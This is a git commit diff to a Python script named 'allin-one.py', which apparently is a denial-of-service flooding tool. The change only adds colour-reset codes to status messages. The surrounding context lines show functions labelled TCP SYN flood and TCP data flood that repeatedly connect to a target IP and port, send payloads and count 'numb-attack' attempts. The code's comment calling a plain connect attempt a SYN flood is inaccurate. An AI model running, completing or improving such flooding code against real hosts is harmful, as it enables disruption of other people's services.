8d9b8c6bd91f9a8c183e2d36b039855210179d14
termul488-ai <termul488@gmail.com>
2026-01-09 17:29:59 +0700

    Update allin-one.py

--- allin-one.py
+++ allin-one.py
@@ -79,7 +79,7 @@ def tcp_syn_flood_single(ip, port, duration):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!")
+            print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!\033[0m")
             print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
@@ -143,7 +143,7 @@ def tcp_data_flood_multi(ip, port, duration, packet_size):
             sock.connect((ip, port))
             while time.time() < end_time:
                 time.sleep(0.3)
-                print("\033[48;5;0mStarting TCP SYN flood Multi-threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
+                print("\033[48;5;0mStarting TCP SYN flood Multi-threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!\033[0m")
                 print("\033[33m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack\033[0m") 
                 sock.send(payload)
                 packet_count[0] += 1
